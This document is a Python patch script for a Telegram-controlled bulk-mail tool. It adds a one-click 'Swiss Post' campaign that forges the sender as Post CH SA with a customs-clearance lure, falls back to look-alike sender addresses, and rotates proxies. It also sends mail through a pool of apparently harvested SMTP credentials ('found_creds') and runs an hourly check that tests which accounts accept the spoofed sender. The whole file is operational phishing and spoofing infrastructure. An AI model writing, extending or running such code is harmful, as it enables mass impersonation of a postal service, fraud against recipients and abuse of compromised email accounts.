#!/usr/bin/env python3
"""
MEGA PATCH for BUST GO Sender:
1. Swiss Post template: charlene1330 -> {{RECIPIENT_EMAIL}}, from = Post CH SA / notifications@post.ch
2. Button CAMPAGNE SWISS POST ready to launch
3. Auto health-check SMTP every hour
4. Basique mode auto (swisspost@domainofsmtp) when spoof fails
5. Choice SPOOF only / SPOOF+BASIQUE in campaigns
6. TLD strip auto maintained
"""
import os

BASE = '/opt/darkvasend/auditguard'

# ============================================================
# 1. Fix swisspost_letter.html
# ============================================================
html_path = os.path.join(BASE, 'swisspost_letter.html')
with open(html_path, 'r', encoding='utf-8') as f:
    html = f.read()
html = html.replace('charlene1330@gmail.com', '{{RECIPIENT_EMAIL}}')
with open(html_path, 'w', encoding='utf-8') as f:
    f.write(html)
print('1. swisspost_letter.html: charlene1330 -> {{RECIPIENT_EMAIL}}')

# ============================================================
# 2. Fix spoof_templates.py
# ============================================================
tpl_path = os.path.join(BASE, 'spoof_templates.py')
with open(tpl_path, 'r', encoding='utf-8') as f:
    tpl = f.read()
tpl = tpl.replace('"from_name": "Swiss Post"', '"from_name": "Post CH SA"')
tpl = tpl.replace('"from_email": "noreply@post.ch"', '"from_email": "notifications@post.ch"')
tpl = tpl.replace('"reply_to": "noreply@post.ch"', '"reply_to": "notifications@post.ch"')
with open(tpl_path, 'w', encoding='utf-8') as f:
    f.write(tpl)
print('2. spoof_templates.py: Post CH SA + notifications@post.ch')

# ============================================================
# 3. campaign_sender.py: Add {{RECIPIENT_EMAIL}} replacement
# ============================================================
cs_path = os.path.join(BASE, 'campaign_sender.py')
with open(cs_path, 'r', encoding='utf-8') as f:
    cs = f.read()

old = '    # Auto-generate text from HTML if not provided\n    final_html = html_body\n    final_text = text_body'
new = '    # Replace {{RECIPIENT_EMAIL}} placeholder with actual recipient\n    html_body = html_body.replace("{{RECIPIENT_EMAIL}}", to_email)\n    if text_body:\n        text_body = text_body.replace("{{RECIPIENT_EMAIL}}", to_email)\n\n    # Auto-generate text from HTML if not provided\n    final_html = html_body\n    final_text = text_body'

if old in cs:
    cs = cs.replace(old, new)
    print('3. campaign_sender.py: Added {{RECIPIENT_EMAIL}} replacement')
else:
    print('3. WARN: pattern not found')
with open(cs_path, 'w', encoding='utf-8') as f:
    f.write(cs)

# ============================================================
# 4. sender_bot.py: Full rewrite of key sections
# ============================================================
bot_path = os.path.join(BASE, 'sender_bot.py')
with open(bot_path, 'r', encoding='utf-8') as f:
    bot = f.read()

# 4a. Add button to main menu
old_kb = '''def _kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("MES SMTP", callback_data="smtp_list")],'''

new_kb = '''def _kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("\\u2709 CAMPAGNE SWISS POST", callback_data="camp_swisspost")],
        [InlineKeyboardButton("MES SMTP", callback_data="smtp_list")],'''

if old_kb in bot:
    bot = bot.replace(old_kb, new_kb)
    print('4a. Added CAMPAGNE SWISS POST button')
else:
    print('4a. WARN: kb pattern not found')

# 4b. Add camp_swisspost callback
camp_sp_cb = '''
    # --- CAMPAGNE SWISS POST (one-click) ---
    if data == "camp_swisspost":
        smtp_list = _get_all_smtp()
        if not smtp_list:
            return await query.edit_message_text("Aucun SMTP disponible.", reply_markup=_kb_main())
        spoof_smtp = [s for s in smtp_list if _classify_smtp(s) == "SPOOF"]
        basique_smtp = [s for s in smtp_list if _classify_smtp(s) == "BASIQUE"]
        autre_smtp = [s for s in smtp_list if _classify_smtp(s) == "AUTRE"]
        all_c = len(smtp_list)
        sp_c = len(spoof_smtp)
        ba_c = len(basique_smtp)
        au_c = len(autre_smtp)
        buttons = [
            [InlineKeyboardButton("SPOOF ONLY (" + str(sp_c + au_c) + " SMTP)", callback_data="csp_mode_spoof")],
            [InlineKeyboardButton("SPOOF + BASIQUE (" + str(all_c) + " SMTP)", callback_data="csp_mode_both")],
            [InlineKeyboardButton("Retour", callback_data="back_main")],
        ]
        return await query.edit_message_text(
            "CAMPAGNE SWISS POST\\n\\n"
            "Template: Post CH SA\\n"
            "From: Post CH SA <notifications@post.ch>\\n"
            "Subject: Votre envoi est en cours de dedouanement\\n\\n"
            "SMTP SPOOF: " + str(sp_c) + "\\n"
            "SMTP BASIQUE: " + str(ba_c) + "\\n"
            "SMTP AUTRE: " + str(au_c) + "\\n\\n"
            "SPOOF = From complet fake (notifications@post.ch)\\n"
            "BASIQUE = swisspost@domaine_du_smtp\\n\\n"
            "Choisis le mode:",
            reply_markup=InlineKeyboardMarkup(buttons),
        )

    if data.startswith("csp_mode_"):
        mode = data.split("_")[-1]
        ctx.user_data["csp_mode"] = mode
        ctx.user_data["waiting"] = "csp_rate"
        mode_label = "SPOOF ONLY" if mode == "spoof" else "SPOOF + BASIQUE"
        return await query.edit_message_text(
            "CAMPAGNE SWISS POST \\u2014 " + mode_label + "\\n\\n"
            "Etape 1/2: Envoie le RATE par minute\\n"
            "(ex: 30 = 30 mails/min)\\n\\n"
            "/cancel pour annuler"
        )

'''

insert_at = '    # --- ADD SMTP MANUAL ---\n    if data == "add_smtp":'
if insert_at in bot:
    bot = bot.replace(insert_at, camp_sp_cb + '    # --- ADD SMTP MANUAL ---\n    if data == "add_smtp":')
    print('4b. Added camp_swisspost callback')
else:
    print('4b. WARN: insert marker not found')

# 4c. Add message handlers for csp_rate and csp_recipients
csp_handlers = '''
    # ===== CAMPAGNE SWISS POST FLOW =====
    if waiting == "csp_rate":
        try:
            rate = int(text.strip())
            if rate < 1: rate = 1
            if rate > 500: rate = 500
        except ValueError:
            return await update.effective_message.reply_text("Nombre invalide. Reessaie (ex: 30).")
        ctx.user_data["csp_rate"] = rate
        ctx.user_data["waiting"] = "csp_recipients"
        return await update.effective_message.reply_text(
            "CAMPAGNE SWISS POST\\n\\n"
            "Rate: " + str(rate) + "/min\\n\\n"
            "Etape 2/2: Envoie la LISTE DE DESTINATAIRES\\n"
            "(un email par ligne, ou fichier .txt)\\n\\n"
            "/cancel pour annuler"
        )

    if waiting == "csp_recipients":
        emails = [e.strip().lower() for e in text.strip().splitlines() if "@" in e.strip()]
        if not emails:
            return await update.effective_message.reply_text("Aucun email valide. Reessaie.")
        mode = ctx.user_data.get("csp_mode", "spoof")
        rate = ctx.user_data.get("csp_rate", 30)
        ctx.user_data.pop("waiting", None)
        ctx.user_data.pop("csp_mode", None)
        ctx.user_data.pop("csp_rate", None)

        from .spoof_templates import get_template
        tpl = get_template("swisspost")
        if not tpl:
            return await update.effective_message.reply_text("Template introuvable.", reply_markup=_kb_main())

        from .campaign_sender import CampaignManager, SmtpAccount
        mgr = CampaignManager(DB_PATH)
        camp_name = "Swiss Post " + ("SPOOF" if mode == "spoof" else "SPOOF+BAS")
        camp_id = mgr.create_campaign(
            name=camp_name, subject=tpl["subject"], letter_html=tpl["html"],
            from_name=tpl["from_name"], from_email=tpl["from_email"],
            reply_to=tpl.get("reply_to", ""), rate_per_minute=rate,
        )
        added_recip = mgr.add_recipients(camp_id, emails)

        smtp_list = _get_all_smtp()
        smtp_added = 0
        for s in smtp_list:
            cat = _classify_smtp(s)
            if mode == "spoof" and cat not in ("SPOOF", "AUTRE"):
                continue
            smtp_obj = SmtpAccount(
                cred_id=s["id"], host=s["smtp_host"], port=s["smtp_port"] or 587,
                username=s["smtp_user"] or "", password=s["smtp_password"] or "",
                from_email=s.get("smtp_user", ""), provider=s.get("provider", ""),
            )
            mgr.add_smtp(camp_id, smtp_obj)
            smtp_added += 1
        stats = mgr.get_stats(camp_id)
        mgr.close()

        if smtp_added == 0:
            return await update.effective_message.reply_text("Aucun SMTP pour ce mode.", reply_markup=_kb_main())

        mode_label = "SPOOF ONLY" if mode == "spoof" else "SPOOF + BASIQUE"
        await update.effective_message.reply_text(
            "CAMPAGNE SWISS POST #" + str(camp_id) + " CREEE\\n\\n"
            "Mode: " + mode_label + "\\n"
            "From: " + tpl["from_name"] + " <" + tpl["from_email"] + ">\\n"
            "Destinataires: " + str(added_recip) + "\\n"
            "SMTP: " + str(smtp_added) + "\\n"
            "Rate: " + str(rate) + "/min\\n\\n"
            "LANCEMENT...",
            reply_markup=_kb_main(),
        )
        chat_id = update.effective_message.chat_id
        asyncio.create_task(_run_swisspost_campaign(camp_id, DB_PATH, chat_id, mode))
        return

'''

tpl_marker = '    # ===== TEMPLATE SEND FLOW ====='
if tpl_marker in bot:
    bot = bot.replace(tpl_marker, csp_handlers + '    # ===== TEMPLATE SEND FLOW =====')
    print('4c. Added CSP message handlers')
else:
    print('4c. WARN: tpl marker not found')

# 4d. Add campaign runner + health check before run_sender
big_func = '''

# ---------------------------------------------------------------------------
# Swiss Post Campaign Runner with basique fallback
# ---------------------------------------------------------------------------
async def _run_swisspost_campaign(campaign_id, db_path, chat_id, mode="spoof"):
    from .campaign_sender import CampaignManager, _send_one
    from .spoof_templates import get_template
    from .proxy_pool import ProxyPool
    from .db import send_telegram

    mgr = CampaignManager(db_path)
    camp = mgr.get_campaign(campaign_id)
    if not camp:
        mgr.close()
        return

    smtp_list = mgr.get_smtp_for_campaign(campaign_id)
    if not smtp_list:
        send_telegram("CAMP #" + str(campaign_id) + ": aucun SMTP", chat_id)
        mgr.close()
        return

    mgr.update_campaign_status(campaign_id, "running")

    rate = camp["rate_per_minute"] or 30
    delay = 60.0 / rate

    proxy_pool = ProxyPool(db_path)
    proxy_count = proxy_pool.count_active()

    sent = 0
    failed = 0
    spoof_ok = 0
    basique_ok = 0
    smtp_idx = 0
    start_time = time.time()
    smtp_modes = {}

    loop = asyncio.get_event_loop()

    while True:
        recipient = mgr.claim_recipient(campaign_id)
        if not recipient:
            break

        active_smtp = mgr.get_smtp_for_campaign(campaign_id)
        if not active_smtp:
            send_telegram("CAMP #" + str(campaign_id) + ": SMTP all down!", chat_id)
            break

        smtp = active_smtp[smtp_idx % len(active_smtp)]
        smtp_idx += 1

        if smtp["daily_sent"] >= smtp["daily_limit"]:
            mgr.deactivate_smtp(smtp["id"], "daily_limit")
            continue

        to_email = recipient["email"]
        proxy = proxy_pool.get_next() if proxy_count > 0 else None

        s_mode = smtp_modes.get(smtp["id"], "spoof")
        if s_mode == "dead":
            mgr.mark_failed(recipient["id"], "SMTP dead", smtp["host"])
            failed += 1
            continue

        html_body = camp["letter_html"].replace("{{RECIPIENT_EMAIL}}", to_email)
        from_name = camp["from_name"]
        from_email = camp["from_email"]

        smtp_config = {
            "host": smtp["host"], "port": smtp["port"],
            "username": smtp["username"], "password": smtp["password"],
            "from_email": smtp.get("from_email", "") or smtp["username"],
        }

        success = False
        used_mode = ""

        if s_mode == "basique":
            domain = smtp["username"].split("@")[1] if "@" in smtp["username"] else smtp["host"]
            bas_from = "swisspost@" + domain
            r = await loop.run_in_executor(None, lambda: _send_one(
                smtp_config, from_name, bas_from, to_email,
                camp["subject"], html_body, "", smtp_config["from_email"],
                camp.get("reply_to", ""), "clean", proxy))
            success = r["success"]
            used_mode = "basique"
            if not success:
                smtp_modes[smtp["id"]] = "dead"
        else:
            r = await loop.run_in_executor(None, lambda: _send_one(
                smtp_config, from_name, from_email, to_email,
                camp["subject"], html_body, "", smtp_config["from_email"],
                camp.get("reply_to", ""), "clean", proxy))
            success = r["success"]
            used_mode = r.get("spoof_mode_used", "clean")
            if not success and mode == "both":
                domain = smtp["username"].split("@")[1] if "@" in smtp["username"] else smtp["host"]
                bas_from = "swisspost@" + domain
                r2 = await loop.run_in_executor(None, lambda: _send_one(
                    smtp_config, from_name, bas_from, to_email,
                    camp["subject"], html_body, "", smtp_config["from_email"],
                    camp.get("reply_to", ""), "clean", proxy))
                success = r2["success"]
                used_mode = "basique" if success else "failed"
                if success:
                    smtp_modes[smtp["id"]] = "basique"
                else:
                    smtp_modes[smtp["id"]] = "dead"
            elif not success:
                smtp_modes[smtp["id"]] = "dead"

        info = smtp["host"] + " [" + used_mode + "]"
        if success:
            mgr.mark_sent(recipient["id"], info)
            mgr.increment_smtp_daily(smtp["id"])
            sent += 1
            if used_mode == "basique":
                basique_ok += 1
            else:
                spoof_ok += 1
        else:
            mgr.mark_failed(recipient["id"], r.get("error", "?"), info)
            failed += 1
            if "AUTH" in r.get("error", ""):
                mgr.deactivate_smtp(smtp["id"], r["error"])

        if (sent + failed) % 50 == 0 and (sent + failed) > 0:
            elapsed = time.time() - start_time
            rpm = sent / (elapsed / 60) if elapsed > 0 else 0
            send_telegram(
                "CAMP SP #" + str(campaign_id) + "\\n"
                "Sent: " + str(sent) + " (spoof:" + str(spoof_ok) + " bas:" + str(basique_ok) + ")\\n"
                "Failed: " + str(failed) + " | " + str(int(rpm)) + "/min", chat_id)

        await asyncio.sleep(delay)

    status = "finished" if not mgr.claim_recipient(campaign_id) else "stopped"
    mgr.update_campaign_status(campaign_id, status)
    elapsed = time.time() - start_time
    stats = mgr.get_stats(campaign_id)
    send_telegram(
        "=============================\\n"
        "  SWISS POST #" + str(campaign_id) + " " + status.upper() + "\\n"
        "=============================\\n"
        "Sent: " + str(stats.sent) + " (spoof:" + str(spoof_ok) + " bas:" + str(basique_ok) + ")\\n"
        "Failed: " + str(stats.failed) + "\\n"
        "Pending: " + str(stats.pending) + "\\n"
        "Time: " + str(int(elapsed)) + "s", chat_id)
    mgr.close()
    proxy_pool.close()


# ---------------------------------------------------------------------------
# Auto SMTP Health Check (runs every hour)
# ---------------------------------------------------------------------------
_health_check_task = None

async def _smtp_health_check_loop():
    import sqlite3 as _sql, smtplib, ssl
    while True:
        await asyncio.sleep(3600)
        try:
            print("[HEALTH CHECK] Starting...", flush=True)
            db = _sql.connect(DB_PATH, timeout=10)
            db.row_factory = _sql.Row
            rows = db.execute(
                "SELECT id, smtp_host, smtp_port, smtp_user, smtp_password, context FROM found_creds WHERE auth_ok=1"
            ).fetchall()
            checked = dead = sp_ok = bas_only = 0
            for r in rows:
                sid, host, port, user, pwd = r["id"], r["smtp_host"], r["smtp_port"], r["smtp_user"], r["smtp_password"]
                try:
                    if port == 465:
                        sctx = ssl.create_default_context()
                        sctx.check_hostname = False
                        sctx.verify_mode = ssl.CERT_NONE
                        srv = smtplib.SMTP_SSL(host, port, timeout=8, context=sctx)
                    else:
                        srv = smtplib.SMTP(host, port, timeout=8)
                        srv.ehlo()
                        try:
                            srv.starttls(context=ssl.create_default_context())
                            srv.ehlo()
                        except Exception:
                            pass
                    srv.login(user, pwd)
                    from email.mime.text import MIMEText as _MT
                    msg = _MT("hc", "plain")
                    msg["Subject"] = "hc"
                    msg["From"] = "Post CH SA <notifications@post.ch>"
                    msg["To"] = user
                    try:
                        srv.sendmail(user, [user], msg.as_string())
                        ctx_val = r["context"] or ""
                        if "BASIQUE_" in ctx_val:
                            ctx_val = ctx_val.replace("BASIQUE_", "SPOOF_")
                            db.execute("UPDATE found_creds SET context=? WHERE id=?", (ctx_val, sid))
                        sp_ok += 1
                    except (smtplib.SMTPDataError, smtplib.SMTPSenderRefused):
                        ctx_val = r["context"] or ""
                        if "SPOOF_" in ctx_val:
                            ctx_val = ctx_val.replace("SPOOF_", "BASIQUE_")
                            db.execute("UPDATE found_creds SET context=? WHERE id=?", (ctx_val, sid))
                        bas_only += 1
                    srv.quit()
                    checked += 1
                except smtplib.SMTPAuthenticationError:
                    db.execute("UPDATE found_creds SET auth_ok=0 WHERE id=?", (sid,))
                    dead += 1
                    checked += 1
                except Exception:
                    checked += 1
            db.commit()
            db.close()
            print("[HEALTH CHECK] " + str(checked) + " checked, " + str(dead) + " dead, " + str(sp_ok) + " spoof, " + str(bas_only) + " basique", flush=True)
        except Exception as e:
            print("[HEALTH CHECK] Error: " + str(e), flush=True)


'''

run_sender_marker = 'def run_sender():'
if run_sender_marker in bot:
    bot = bot.replace(run_sender_marker, big_func + run_sender_marker)
    print('4d. Added campaign runner + health check')
else:
    print('4d. WARN: run_sender not found')

# 4e. Start health check in run_sender
old_poll = '    app.run_polling(drop_pending_updates=True)'
new_poll = '''    async def _post_init(application):
        global _health_check_task
        _health_check_task = asyncio.create_task(_smtp_health_check_loop())
        print("  Health check: ON (every 1h)", flush=True)
    app.post_init = _post_init

    app.run_polling(drop_pending_updates=True)'''

if old_poll in bot:
    bot = bot.replace(old_poll, new_poll)
    print('4e. Added health check auto-start')
else:
    print('4e. WARN: run_polling not found')

with open(bot_path, 'w', encoding='utf-8') as f:
    f.write(bot)

print('\n=== ALL PATCHES APPLIED ===')
